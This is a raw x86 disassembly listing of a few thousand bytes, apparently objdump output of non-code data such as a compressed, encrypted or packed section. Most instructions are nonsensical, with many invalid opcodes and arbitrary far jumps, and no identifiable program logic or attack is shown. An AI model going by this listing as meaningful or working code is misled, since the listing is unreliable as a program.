  4071cb:	mov    cl,0x72
  4071cd:	enter  0x4826,0xb1
  4071d1:	aas    
  4071d2:	ret    0xe210
  4071d5:	xor    ah,BYTE PTR [esi+ebx*1-0x20]
  4071d9:	cld    
  4071da:	pop    esp
  4071db:	adc    eax,0x273134b8
  4071e0:	(bad)  
  4071e1:	hlt    
  4071e2:	out    0x2b,al
  4071e4:	stos   BYTE PTR es:[edi],al
  4071e5:	cmp    al,0x2
  4071e7:	std    
  4071e8:	enter  0xb268,0xd7
  4071ec:	out    dx,al
  4071ed:	inc    edx
  4071ee:	xchg   edx,eax
  4071ef:	sbb    BYTE PTR [esp+eax*2+0x7c047494],cl
  4071f6:	dec    edi
  4071f7:	xor    dh,0xfa
  4071fa:	add    BYTE PTR [ebx+0x402424dd],ch
  407200:	aaa    
  407201:	loop   0x40718d
  407203:	test   BYTE PTR [ecx+0x1daf8570],ah
  407209:	shr    BYTE PTR [esi-0x49122690],0xf
  407210:	sub    bl,cl
  407212:	fisub  WORD PTR [eax+0x4b266d80]
  407218:	les    eax,FWORD PTR [ecx*4+0x2c576c0a]
  40721f:	arpl   WORD PTR [ebp+ebx*8+0x503d002d],di
  407226:	cmp    eax,0x1b7ddfaa
  40722b:	mov    bl,0x55
  40722d:	fidivr DWORD PTR [esi]
  40722f:	inc    ebp
  407230:	cs dec ebp
  407232:	cmp    BYTE PTR [ebp-0x65767725],bl
  407238:	inc    edi
  407239:	add    al,0x2c
  40723b:	int3   
  40723c:	retf   
  40723d:	push   ds
  40723e:	cld    
  40723f:	xchg   esp,eax
  407240:	dec    edx
  407241:	mov    ch,0x16
  407243:	push   ds
  407244:	push   ss
  407245:	retf   0x385c
  407248:	pop    edi
  407249:	pop    esp
  40724a:	jno    0x40728a
  40724c:	xchg   ebp,eax
  40724d:	jge    0x40722e
  40724f:	jmp    0x40724b
  407251:	outs   dx,BYTE PTR ds:[esi]
  407252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407253:	aas    
  407254:	mov    ds:0x9a55f1f5,al
  407259:	loop   0x4072ab
  40725b:	cmp    ah,BYTE PTR [ecx-0x7a9a7a70]
  407261:	xor    al,0x36
  407263:	mov    DWORD PTR [edx-0x4],eax
  407266:	mov    ebp,edi
  407268:	sbb    ebp,edx
  40726a:	jae    0x407207
  40726c:	fs (bad) 
  40726e:	mov    dh,0xf7
  407270:	inc    esi
  407271:	sahf   
  407272:	shl    DWORD PTR [edi],1
  407274:	in     eax,0xd9
  407276:	dec    ecx
  407277:	dec    esi
  407278:	mul    bh
  40727a:	mov    dl,0xdb
  40727c:	or     BYTE PTR [eax-0x3b],ah
  40727f:	sub    esi,DWORD PTR [edx]
  407281:	jne    0x40722a
  407283:	inc    ebx
  407284:	pop    ss
  407285:	(bad)  
  407286:	mov    ebx,0x4ceeb168
  40728b:	out    0x6f,eax
  40728d:	inc    edi
  40728e:	ret    
  40728f:	mov    ebx,0x1f1b3f34
  407294:	loopne 0x4072b4
  407296:	sahf   
  407297:	retf   
  407298:	xor    bh,ah
  40729a:	mov    ecx,0xe44a63f8
  40729f:	mov    bl,0x3e
  4072a1:	adc    DWORD PTR [esi+edx*1],0xda0c89d8
  4072a8:	mov    bh,0x7
  4072aa:	popa   
  4072ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072ac:	xor    bh,al
  4072ae:	jae    0x4072ec
  4072b0:	imul   esp,DWORD PTR [ebp+0x26],0x7d28c851
  4072b7:	add    ecx,esp
  4072b9:	jl     0x40727f
  4072bb:	mov    ch,0xe1
  4072bd:	mov    bl,0xd8
  4072bf:	xor    eax,0xf6a748da
  4072c4:	adc    DWORD PTR [ebp-0x69],0xffffff9b
  4072c8:	not    DWORD PTR [ecx*8-0x20c77a02]
  4072cf:	inc    ebx
  4072d0:	pop    eax
  4072d1:	(bad)
  4072d4:	lahf   
  4072d5:	push   ds
  4072d6:	push   esi
  4072d7:	hlt    
  4072d8:	mov    edi,0x471b80e0
  4072dd:	xor    edx,ebx
  4072df:	scas   eax,DWORD PTR es:[edi]
  4072e0:	push   esi
  4072e1:	data16 loop 0x407280
  4072e4:	adc    eax,0x8020cb3e
  4072e9:	mov    edi,0x6de45236
  4072ee:	or     DWORD PTR [eax],ebx
  4072f0:	dec    eax
  4072f1:	rol    DWORD PTR [ebx-0x32],0xc7
  4072f5:	adc    bl,0xa7
  4072f8:	add    DWORD PTR [edx+0x7e],edi
  4072fb:	jne    0x40732b
  4072fd:	(bad)  
  4072fe:	pop    edx
  4072ff:	les    ebx,FWORD PTR [esi-0x25]
  407302:	cdq    
  407303:	inc    edx
  407304:	xchg   BYTE PTR [edi-0x30cabd4b],bl
  40730a:	jmp    0x407376
  40730c:	fcom   QWORD PTR [ebx-0x123698f1]
  407312:	cmp    DWORD PTR ss:[ebp+0x5ec611f9],ebp
  407319:	retf   
  40731a:	ins    BYTE PTR es:[edi],dx
  40731b:	jle    0x407380
  40731d:	gs jbe 0x4072d0
  407320:	mov    cl,0xc7
  407322:	ficom  DWORD PTR [ecx-0x14]
  407325:	or     ecx,edi
  407327:	or     edx,edx
  407329:	and    al,BYTE PTR [ecx+0x4d]
  40732c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40732d:	push   ecx
  40732e:	(bad)  
  40732f:	or     al,0xd3
  407331:	mov    ah,0xe0
  407333:	ret    0xdf08
  407336:	repnz outs dx,DWORD PTR ds:[esi]
  407338:	das    
  407339:	dec    esp
  40733a:	xchg   ebp,eax
  40733b:	(bad)  
  40733c:	ret    0x147e
  40733f:	mov    ebp,0xb5e21605
  407344:	jge    0x4072ef
  407346:	cdq    
  407347:	cmp    BYTE PTR [edx+0x68fffac9],cl
  40734d:	hlt    
  40734e:	aas    
  40734f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407350:	retf   0x5c85
  407353:	push   ebp
  407354:	test   al,0xdb
  407356:	std    
  407357:	xchg   ch,ah
  407359:	mov    dl,0xad
  40735b:	fs jp  0x40734c
  40735e:	mov    dl,0x5f
  407360:	add    al,BYTE PTR [ecx+0x7c]
  407363:	in     eax,dx
  407364:	int3   
  407365:	xchg   BYTE PTR [ebp-0x6075f301],cl
  40736b:	js     0x407373
  40736d:	sbb    DWORD PTR [edi],eax
  40736f:	and    ebp,DWORD PTR [ebx-0x1cfd9a6f]
  407375:	xchg   edi,eax
  407376:	hlt    
  407377:	pop    ebx
  407378:	ss jns 0x407308
  40737b:	and    eax,0x64cd9666
  407380:	xor    edx,DWORD PTR [esi+0x5106c802]
  407386:	ins    BYTE PTR es:[edi],dx
  407387:	fcomp  QWORD PTR [ecx]
  407389:	bound  ebp,QWORD PTR [esp+edi*2-0x7a]
  40738d:	scas   al,BYTE PTR es:[edi]
  40738e:	inc    ebx
  40738f:	aaa    
  407390:	aaa    
  407391:	dec    eax
  407392:	in     al,0xae
  407394:	adc    al,0x9b
  407396:	sbb    al,0xf2
  407398:	jns    0x407379
  40739a:	int3   
  40739b:	into   
  40739c:	dec    esp
  40739d:	xor    al,0x21
  40739f:	cmc    
  4073a0:	inc    eax
  4073a1:	jne    0x407392
  4073a3:	pop    ebp
  4073a4:	jmp    0xe3aa9ac
  4073a9:	and    eax,0x9822b940
  4073ae:	arpl   WORD PTR [edx+0x2af6464f],dx
  4073b4:	jns    0x407347
  4073b6:	jb     0x407360
  4073b8:	arpl   ax,dx
  4073ba:	pop    edi
  4073bb:	fs push ds
  4073bd:	mov    BYTE PTR [ecx-0x26],bh
  4073c0:	cdq    
  4073c1:	xor    edx,esi
  4073c3:	daa    
  4073c4:	jl     0x4073e2
  4073c6:	jb     0x40740b
  4073c8:	or     BYTE PTR [edx+0x77fd6608],ch
  4073ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073cf:	popa   
  4073d0:	enter  0xbeef,0x5b
  4073d4:	scas   al,BYTE PTR es:[edi]
  4073d5:	xchg   DWORD PTR [edx-0x5edaf09d],edi
  4073db:	(bad)  
  4073dc:	repz or al,0x3f
  4073df:	add    ebp,DWORD PTR [eax+0x52fa0b1d]
  4073e5:	stos   BYTE PTR es:[edi],al
  4073e6:	mov    bh,BYTE PTR [ebp+0x35861d30]
  4073ec:	jmp    0xb86d:0xcd492419
  4073f3:	ret    0xa70c
  4073f6:	dec    ebp
  4073f7:	xor    cl,al
  4073f9:	mov    WORD PTR [edi-0x61],cs
  4073fc:	mov    eax,ds:0x87b51f00
  407401:	lahf   
  407402:	cwde   
  407403:	mov    edx,0xd348e32
  407408:	or     edi,DWORD PTR [esi]
  40740a:	stc    
  40740b:	daa    
  40740c:	retf   
  40740d:	mov    ch,0x17
  40740f:	jecxz  0x407432
  407411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407412:	jns    0x4073e4
  407414:	adc    eax,0x7efe80d2
  407419:	push   0x32
  40741b:	loop   0x40741f
  40741d:	cmp    DWORD PTR [ebp-0x2fbf198a],ecx
  407423:	jb     0x407431
  407425:	xor    DWORD PTR [edx+eax*4-0x69],edi
  407429:	lds    edx,FWORD PTR [ecx-0x2ae3c265]
  40742f:	cs mov dh,0x6e
  407432:	in     al,dx
  407433:	aaa    
  407434:	mov    dl,0xf1
  407436:	fcomp  QWORD PTR [ecx]
  407438:	add    DWORD PTR es:[ebp+0x47],0x47
  40743d:	xlat   BYTE PTR ds:[ebx]
  40743e:	inc    esp
  40743f:	adc    ah,BYTE PTR ds:0xc26a68bd
  407445:	fdivr  QWORD PTR [edi+0x1a1e4cba]
  40744b:	mov    DWORD PTR [ebx+ebp*2],ebp
  40744e:	push   0xfffffff6
  407450:	enter  0x24ad,0x33
  407454:	jmp    0x809c:0x66d9fdd0
  40745b:	js     0x4074b5
  40745d:	add    BYTE PTR [ebp+0x47686b2c],al
  407463:	(bad)  
  407464:	js     0x407476
  407466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407467:	mov    al,0xbd
  407469:	push   edx
  40746a:	repz aas 
  40746c:	xor    esi,DWORD PTR [edi-0x78]
  40746f:	push   ebx
  407470:	inc    esp
  407471:	call   0xf5b2:0xdf6c1fcb
  407478:	stc    
  407479:	sub    eax,ecx
  40747b:	bound  ebx,QWORD PTR [esp+0x7b]
  40747f:	iret   
  407480:	push   ds
  407481:	repz mov ds:0x7b59b1c7,al
  407487:	pop    ecx
  407488:	js     0x4074cf
  40748a:	clc    
  40748b:	int3   
  40748c:	adc    BYTE PTR [ebx],ah
  40748e:	mov    ah,0x23
  407490:	enter  0xbc56,0xe0
  407494:	dec    eax
  407495:	imul   BYTE PTR [ebx-0x71c53ad1]
  40749b:	mov    ebx,0x811a0550
  4074a0:	push   esi
  4074a1:	sbb    edi,eax
  4074a3:	sbb    eax,0xcde7dfe
  4074a8:	jl     0x407503
  4074aa:	ins    DWORD PTR es:[edi],dx
  4074ab:	mov    ?,WORD PTR [edi]
  4074ad:	mov    ds,WORD PTR [ebx+0x3b8556df]
  4074b3:	dec    edi
  4074b4:	mov    al,0x58
  4074b6:	iret   
  4074b7:	adc    al,0x57
  4074b9:	dec    edi
  4074ba:	mov    edi,0x8e44e9b4
  4074bf:	fsub   QWORD PTR [ecx]
  4074c1:	adc    esi,DWORD PTR [eax+ebp*2+0x7e]
  4074c5:	jmp    0x6e388b97
  4074ca:	shl    DWORD PTR [edi-0x15],0xe
  4074ce:	xchg   ecx,eax
  4074cf:	add    eax,DWORD PTR [eax]
  4074d1:	inc    ebx
  4074d2:	cdq    
  4074d3:	push   es
  4074d4:	mov    bh,0x1e
  4074d6:	pop    esi
  4074d7:	(bad)  
  4074d8:	and    al,0x22
  4074da:	xchg   esi,eax
  4074db:	push   0x13724564
  4074e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074e1:	xchg   esp,eax
  4074e2:	test   al,0x1c
  4074e4:	mov    ebx,0xad05b595
  4074e9:	jg     0x4074fe
  4074eb:	add    DWORD PTR [edi-0xe],esp
  4074ee:	cmp    edx,DWORD PTR [esi]
  4074f0:	sbb    DWORD PTR [eax+0x4a],esi
  4074f3:	aas    
  4074f4:	fisub  DWORD PTR [edi+ecx*2+0x58740c48]
  4074fb:	jmp    0x1277:0x727a6e1
  407502:	out    0x1f,al
  407504:	pop    es
  407505:	mov    ds:0x238c68ad,al
  40750a:	popf   
  40750b:	inc    ah
  40750d:	sub    eax,0x52eb390a
  407512:	pop    edi
  407513:	fnstsw WORD PTR [edi-0x55]
  407516:	out    dx,eax
  407517:	xor    BYTE PTR [ebx+0x561d58d3],ah
  40751d:	sbb    al,0x4d
  40751f:	daa    
  407520:	sub    dh,ch
  407522:	stos   BYTE PTR es:[edi],al
  407523:	mov    bx,0xd674
  407527:	scas   al,BYTE PTR es:[edi]
  407528:	push   esp
  407529:	and    edi,DWORD PTR ds:0x160f43f5
  40752f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407530:	stos   BYTE PTR es:[edi],al
  407531:	pop    eax
  407532:	sbb    DWORD PTR [ebx-0x5a175004],ebp
  407538:	xor    BYTE PTR [eax],dl
  40753a:	xchg   ebx,eax
  40753b:	jp     0x40752b
  40753d:	mov    dh,0x97
  40753f:	nop
  407540:	je     0x4074dc
  407542:	inc    ebp
  407543:	js     0x407551
  407545:	add    esi,ecx
  407547:	call   0x338e:0xcacb3f42
  40754e:	pop    esi
  40754f:	jns    0x40752c
  407551:	mov    ebx,0xe94a9cf9
  407556:	push   0x19ba3162
  40755b:	js     0x4075bd
  40755d:	push   ebx
  40755e:	xchg   DWORD PTR ds:0x897fa719,esp
  407564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407565:	add    BYTE PTR [eax+0x7b8ce500],dh
  40756b:	add    eax,0xfba3426b
  407570:	or     bh,BYTE PTR ds:0xa2ced7be
  407576:	pop    esp
  407577:	jmp    0xeba6:0x77501e7d
  40757e:	mov    esi,0x2b36b02
  407583:	pushf  
  407584:	leave  
  407585:	add    dl,dh
  407587:	int3   
  407588:	cli    
  407589:	nop
  40758a:	or     BYTE PTR [ebx],0xdb
  40758d:	fisubr DWORD PTR [ecx-0x6a]
  407590:	mov    ebx,0xec63592d
  407595:	cmp    ecx,edi
  407597:	stc    
  407598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407599:	adc    al,0xb2
  40759b:	inc    ebx
  40759c:	aad    0x15
  40759e:	mov    dl,0x1
  4075a0:	or     al,0xe7
  4075a2:	sbb    dh,0xd3
  4075a5:	js     0x407599
  4075a7:	push   es
  4075a8:	cmc    
  4075a9:	enter  0xa856,0xbc
  4075ad:	push   esp
  4075ae:	add    DWORD PTR [esi],0xffffffa0
  4075b1:	ret    0x90ac
  4075b4:	mov    ecx,0xc2d96a2b
  4075b9:	xchg   ecx,eax
  4075ba:	aaa    
  4075bb:	or     DWORD PTR [eax+0x111595cc],esi
  4075c1:	mov    ds:0x665b15a5,al
  4075c6:	sub    al,ah
  4075c8:	shl    DWORD PTR [esi+0x22],0x7e
  4075cc:	pop    ebx
  4075cd:	add    BYTE PTR es:[edx+0x43],ah
  4075d1:	mov    edx,DWORD PTR ds:0x74853de
  4075d7:	dec    edx
  4075d8:	push   0xd6d17bad
  4075dd:	and    ecx,DWORD PTR ds:0xf41ba8bb
  4075e3:	mov    ds:0x63acca9e,al
  4075e8:	pop    esi
  4075e9:	mov    ebp,0x208feaef
  4075ee:	dec    edi
  4075ef:	lahf   
  4075f0:	and    BYTE PTR [ebp-0x35312a4f],dh
  4075f6:	repnz mov edx,0x287eaf11
  4075fc:	xchg   esp,eax
  4075fd:	add    ah,BYTE PTR [eax+0x993756]
  407603:	jmp    0xd9:0x26e092f9
  40760a:	int3   
  40760b:	fisttp QWORD PTR [bp+0x11]
  40760f:	sahf   
  407610:	add    BYTE PTR [edx+0x1fb22bb7],dl
  407616:	aam    0x81
  407618:	aam    0x5e
  40761a:	sbb    ecx,edi
  40761c:	nop
  40761d:	retf   0x383
  407620:	push   cs
  407621:	jno    0x407699
  407623:	dec    edi
  407624:	aas    
  407625:	and    al,0x1b
  407627:	pop    esi
  407628:	fdivr  st(2),st
  40762a:	mov    ds:0xfff3b4e1,al
  40762f:	aas    
  407630:	ret    
  407631:	lods   eax,DWORD PTR ds:[esi]
  407632:	add    eax,0x667828d0
  407637:	aad    0x80
  407639:	ret    
  40763a:	ret    0xe046
  40763d:	and    BYTE PTR [edi],0xf3
  407640:	mov    eax,ds:0xd2f72799
  407645:	xchg   ah,cl
  407647:	dec    edx
  407648:	mov    BYTE PTR [ecx-0x37],dl
  40764b:	cmp    BYTE PTR [edx],bh
  40764d:	fild   WORD PTR [ebx+0x2b]
  407650:	mov    edx,0x78568c84
  407655:	mov    bl,0xa0
  407657:	jp     0x4075ff
  407659:	sbb    al,0x7a
  40765b:	ror    BYTE PTR [edx],cl
  40765d:	inc    esi
  40765e:	jl     0x407610
  407660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407661:	and    bh,BYTE PTR [edx]
  407663:	dec    esi
  407664:	jb     0x407691
  407666:	pop    ebx
  407667:	jmp    0xc0f59bf6
  40766c:	scas   al,BYTE PTR es:[edi]
  40766d:	mov    ebp,0x6ed2edb8
  407672:	mov    WORD PTR [ebp+edx*1-0x48],ss
  407676:	xchg   DWORD PTR [ecx-0xdf6083c],ebx
  40767c:	div    DWORD PTR [esp+ecx*8]
  40767f:	sbb    eax,0xd19902bf
  407684:	mov    tr0,ebp
  407687:	xor    eax,0xa0ad10a5
  40768c:	push   eax
  40768d:	dec    edx
  40768e:	das    
  40768f:	arpl   WORD PTR [esi+edx*4],dx
  407692:	xor    eax,0x804d9be7
  407697:	pop    esi
  407698:	push   ebx
  407699:	xchg   BYTE PTR [ecx-0x37],bh
  40769c:	imul   esi,ebx,0x79
  40769f:	add    BYTE PTR [esi-0x50],bl
  4076a2:	sbb    ecx,DWORD PTR [edi-0x4]
  4076a5:	add    edi,edx
  4076a7:	push   0xfb722158
  4076ac:	adc    eax,0x99af7774
  4076b1:	test   DWORD PTR [ecx-0x4c49a85a],eax
  4076b7:	xchg   ebx,eax
  4076b8:	scas   eax,DWORD PTR es:[edi]
  4076b9:	sub    DWORD PTR [eax],esp
  4076bb:	aam    0x10
  4076bd:	inc    ecx
  4076be:	ins    DWORD PTR es:[edi],dx
  4076bf:	icebp  
  4076c0:	sub    DWORD PTR [ebx],ecx
  4076c2:	outs   dx,DWORD PTR ds:[esi]
  4076c3:	(bad)  
  4076c4:	in     eax,0xc9
  4076c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076c7:	aaa    
  4076c8:	inc    esi
  4076c9:	psubq  mm0,QWORD PTR ds:0xad553ea7
  4076d0:	cmp    eax,0x32993dee
  4076d5:	jbe    0x4076ce
  4076d7:	push   0xffffff9c
  4076d9:	test   BYTE PTR [eax-0x6b],dl
  4076dc:	push   eax
  4076dd:	mov    al,0x8d
  4076df:	jb     0x40773e
  4076e1:	cwde   
  4076e2:	push   0xffffff99
  4076e4:	xor    al,0x6a
  4076e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076e7:	out    dx,eax
  4076e8:	in     eax,0x84
  4076ea:	fstp   QWORD PTR [esi]
  4076ed:	inc    ecx
  4076ee:	out    dx,eax
  4076ef:	add    esp,eax
  4076f1:	loope  0x40775d
  4076f3:	and    al,0x81
  4076f5:	xor    al,0xee
  4076f7:	adc    eax,0xf9e86249
  4076fc:	xchg   ebp,eax
  4076fd:	test   al,0xd7
  4076ff:	lea    esp,[ebx+0x72]
  407702:	ret    0x2812
  407705:	cmp    al,BYTE PTR [edx]
  407707:	pop    ecx
  407708:	or     dl,cl
  40770a:	push   esp
  40770b:	rcl    DWORD PTR [edx+0x15550fa8],0x90
  407712:	mov    cl,0x97
  407714:	dec    esi
  407715:	sbb    eax,0xc98537b0
  40771a:	pop    edx
  40771b:	adc    al,0x71
  40771d:	test   BYTE PTR [ebx],bh
  40771f:	mov    ds:0xf858b6fd,al
  407724:	mov    eax,0x6fb8426c
  407729:	sub    al,BYTE PTR cs:[edi+0x3b00d521]
  407730:	outs   dx,DWORD PTR ds:[esi]
  407731:	xlat   BYTE PTR ds:[ebx]
  407732:	cmp    esp,esp
  407734:	xor    ah,ch
  407736:	repnz push ss
  407738:	mov    ebx,0xabd748fe
  40773d:	std    
  40773e:	enter  0xab4f,0x9a
  407742:	xor    al,0xcb
  407744:	sbb    al,0xc0
  407746:	cmp    cl,dh
  407748:	(bad)  
  407749:	fsub   DWORD PTR [ebx]
  40774b:	cmp    eax,0xf61cb7fd
  407750:	rcr    bh,1
  407752:	and    eax,0x3dce4c99
  407757:	in     eax,dx
  407758:	sbb    edi,DWORD PTR [eax-0x4b]
  40775b:	xchg   ebp,eax
  40775c:	adc    DWORD PTR [eax+0x3048eb4f],eax
  407762:	inc    esi
  407763:	xchg   ebx,eax
  407764:	adc    BYTE PTR [edi-0x9ae57f5],0xa0
  40776b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40776c:	jmp    0x94ee65a8
  407771:	adc    eax,0x69640c13
  407776:	out    0x27,eax
  407778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407779:	int3   
  40777a:	mov    ecx,0x67e013b8
  40777f:	push   ss
  407780:	sub    bl,BYTE PTR [ebp+0x497ab4b4]
  407786:	imul   esi,esi,0xadd4cd8f
  40778c:	fisttp QWORD PTR [ecx+0x64f2be7c]
  407792:	mov    BYTE PTR [ebx+ebx*4+0x6075e731],al
  407799:	clc    
  40779a:	or     eax,0x33cadbdf
  40779f:	sub    BYTE PTR [edi],dl
  4077a1:	mov    esi,0xfa3bffa6
  4077a6:	jle    0x40773b
  4077a8:	(bad)  
  4077a9:	das    
  4077aa:	cmp    ebp,esi
  4077ac:	pop    ebp
  4077ad:	sub    eax,edi
  4077af:	dec    esi
  4077b0:	cmp    ebp,DWORD PTR [ecx]
  4077b2:	fnstsw WORD PTR [ebx-0x9ad92da]
  4077b8:	xor    al,0xcc
  4077ba:	lods   al,BYTE PTR ds:[esi]
  4077bb:	dec    edx
  4077bc:	repz mov al,ds:0xfadb81f7
  4077c2:	or     bl,BYTE PTR ds:0xde0bf209
  4077c8:	dec    esp
  4077c9:	sub    BYTE PTR [ebp-0x59],cl
  4077cc:	lock mov eax,0x9672073b
  4077d2:	or     bh,BYTE PTR [ebp-0x424b835c]
  4077d8:	mov    ah,BYTE PTR [ecx]
  4077da:	out    dx,eax
  4077db:	into   
  4077dc:	dec    ebx
  4077dd:	push   ecx
  4077de:	cwde   
  4077df:	sbb    edx,DWORD PTR [ebp+0x7f677678]
  4077e5:	cmp    al,0x3
  4077e7:	mov    esi,0xa6ce832b
  4077ec:	hlt    
  4077ed:	ficomp WORD PTR [edi+0x8]
  4077f0:	mov    BYTE PTR [edx],cl
  4077f2:	test   cl,0xca
  4077f5:	arpl   WORD PTR ds:0xce008281,di
  4077fb:	inc    edx
  4077fc:	inc    ebp
  4077fd:	dec    edi
  4077fe:	inc    eax
  4077ff:	mov    esp,0x7acc7a8c
  407804:	daa    
  407805:	(bad)  
  407806:	ja     0x40786b
  407808:	mov    esp,0x3b6cc09c
  40780d:	mov    edx,0x60e97a8d
  407812:	jge    0x4077f3
  407814:	pop    esi
  407815:	shl    BYTE PTR [ebx+0x34],cl
  407818:	xchg   bh,ch
  40781a:	stos   BYTE PTR es:[edi],al
  40781b:	sti    
  40781c:	adc    DWORD PTR [edx-0x2aae37bb],ecx
  407822:	(bad)  
  407823:	int    0x13
  407825:	(bad)  
  407826:	dec    edi
  407827:	push   0xffffffa3
  407829:	cmc    
  40782a:	fcomp  DWORD PTR [ebx]
  40782c:	cmp    eax,0x2247f544
  407831:	pop    es
  407832:	and    eax,0x5d67203e
  407837:	jmp    0x4077e9
  407839:	mov    esp,0xa7fcbec9
  40783e:	dec    eax
  40783f:	repnz push ebp
  407841:	dec    eax
  407842:	push   cs
  407843:	mov    BYTE PTR [esi+ecx*2],cl
  407846:	add    BYTE PTR [esi+edi*8-0x7b],bl
  40784a:	add    eax,0xbc85db83
  40784f:	adc    BYTE PTR [edi],al
  407851:	push   ebp
  407852:	(bad)  
  407853:	jmp    0x407810
  407855:	adc    ebx,ebx
  407857:	mov    esp,0x1bf5070f
  40785c:	push   esi
  40785d:	pop    esp
  40785e:	inc    ebx
  40785f:	daa    
  407860:	or     al,0xe7
  407862:	pop    ss
  407863:	fsub   DWORD PTR [ebp-0xe]
  407866:	add    al,0xc4
  407868:	push   edi
  407869:	shl    BYTE PTR [ebx],cl
  40786b:	retf   0x9f00
  40786e:	mov    ebx,DWORD PTR [edi-0x22]
  407871:	retf   
  407872:	ja     0x407805
  407874:	loope  0x4078b2
  407876:	jae    0x4078cc
  407878:	out    0xcc,eax
  40787a:	in     al,dx
  40787b:	and    cl,BYTE PTR [edx]
  40787d:	or     dh,BYTE PTR [edx+edi*1]
  407880:	call   0xd390:0x1117d609
  407887:	mov    ebx,0x689cfc9e
  40788c:	(bad)  
  40788d:	push   cs
  40788e:	pop    esp
  40788f:	add    al,0x2a
  407891:	and    ebx,DWORD PTR [edi+0x1399b41a]
  407897:	ret    
  407898:	and    bl,BYTE PTR [edi]
  40789a:	jge    0x407831
  40789c:	and    al,0xab
  40789e:	jl     0x4078fe
  4078a0:	popa   
  4078a1:	aaa    
  4078a2:	jp     0x4078f3
  4078a4:	lds    esi,FWORD PTR [edx+0x70a5694d]
  4078aa:	push   ecx
  4078ab:	mov    ebp,DWORD PTR ds:0xbb62bf67
  4078b1:	aaa    
  4078b2:	push   cs
  4078b3:	stos   BYTE PTR es:[edi],al
  4078b4:	not    DWORD PTR [edi+0x3e0f3e9c]
  4078ba:	cmp    ecx,ecx
  4078bc:	out    0x2a,eax
  4078be:	xor    edi,DWORD PTR [ecx+0x60]
  4078c1:	pop    ebx
  4078c2:	adc    bl,BYTE PTR [ebp-0x22]
  4078c5:	jge    0x407887
  4078c7:	call   0x771a1705
  4078cc:	addr16 xor ecx,0x1eeb45fb
  4078d3:	sbb    eax,0xe93f9045
  4078d8:	inc    ebp
  4078d9:	(bad)  
  4078da:	mov    al,0xd1
  4078dc:	pop    ds
  4078dd:	pop    ebx
  4078de:	int3   
  4078df:	mov    ch,0x78
  4078e1:	cmp    esp,DWORD PTR [ebx]
  4078e3:	fs loopne 0x407941
  4078e6:	rcr    BYTE PTR ds:0xcfcb127d,1
  4078ec:	bound  esp,QWORD PTR [edx]
  4078ee:	loopne 0x407908
  4078f0:	jmp    0x18d2:0xba649902
  4078f7:	jge    0x407964
  4078f9:	fs jl  0x4078dc
  4078fc:	mov    WORD PTR [edx-0x405a7035],?
  407902:	cli    
  407903:	xor    DWORD PTR [edi],ecx
  407905:	or     BYTE PTR ds:0xa9926839,bl
  40790b:	int3   
  40790c:	push   esp
  40790d:	ficomp WORD PTR [esi-0x58]
  407910:	push   ss
  407911:	in     al,0x1c
  407913:	xor    bl,BYTE PTR [esi+ecx*1+0x70]
  407917:	int    0x1b
  407919:	retf   
  40791a:	inc    eax
  40791b:	dec    ebp
  40791c:	cmp    esp,DWORD PTR [eax]
  40791e:	js     0x40794d
  407920:	sub    cl,BYTE PTR [ebx-0x7]
  407923:	ja     0x4078fc
  407925:	jp     0x407990
  407927:	aaa    
  407928:	add    dh,ch
  40792a:	(bad)  
  40792b:	ret    0xba6
  40792e:	call   0xc89f:0xd75a967d
  407935:	dec    eax
  407936:	sbb    eax,0x948b587d
  40793b:	sbb    al,0x52
  40793d:	imul   esp,DWORD PTR [esi],0xca9cac2a
  407943:	aam    0x34
  407945:	push   esp
  407946:	in     eax,dx
  407947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407948:	in     eax,0x82
  40794a:	push   0xf6d61bb
  40794f:	stos   BYTE PTR es:[edi],al
  407950:	dec    ebp
  407951:	test   eax,0x8b7daa26
  407956:	mov    ecx,0x1aa316c2
  40795b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40795c:	adc    ebx,eax
  40795e:	and    DWORD PTR [ecx+0x70],eax
  407961:	sbb    ah,BYTE PTR [eax]
  407963:	pop    ss
  407964:	xor    BYTE PTR [esi+0x4],0x8b
  407968:	and    ebp,edx
  40796a:	or     eax,0x7813b02c
  40796f:	fwait
  407970:	popf   
  407971:	add    edi,DWORD PTR [edi+0x5281158]
  407977:	push   ecx
  407978:	dec    edx
  407979:	test   eax,0xd98da600
  40797e:	dec    ebp
  40797f:	xchg   ebp,eax
  407980:	loop   0x407945
  407982:	jnp    0x407a02
  407984:	call   0x5eb:0x8580879a
  40798b:	jb     0x407a05
  40798d:	imul   esp,DWORD PTR [ecx-0x7],0xfffffffa
  407991:	pushf  
  407992:	mov    ss,WORD PTR [ebx+0x32fbd557]
  407998:	paddb  mm0,QWORD PTR [ecx-0x4de94ae0]
  40799f:	into   
  4079a0:	adc    al,0x40
  4079a2:	out    dx,al
  4079a3:	mov    dh,0xb2
  4079a5:	or     DWORD PTR [ebx-0x513e21d8],0xffffffba
  4079ac:	push   edx
  4079ad:	and    DWORD PTR ds:0x58574bcb,edi
  4079b3:	lods   eax,DWORD PTR ds:[esi]
  4079b4:	inc    edi
  4079b5:	push   esp
  4079b6:	cmp    ebp,DWORD PTR [ecx]
  4079b8:	fs sti 
  4079ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079bb:	rol    BYTE PTR ds:0xa146c701,0x2d
  4079c2:	mov    dl,0x8b
  4079c4:	outs   dx,BYTE PTR ds:[esi]
  4079c5:	scas   al,BYTE PTR es:[edi]
  4079c6:	push   cs
  4079c7:	add    al,0x7f
  4079c9:	scas   eax,DWORD PTR es:[edi]
  4079ca:	add    al,0x86
  4079cc:	dec    ebx
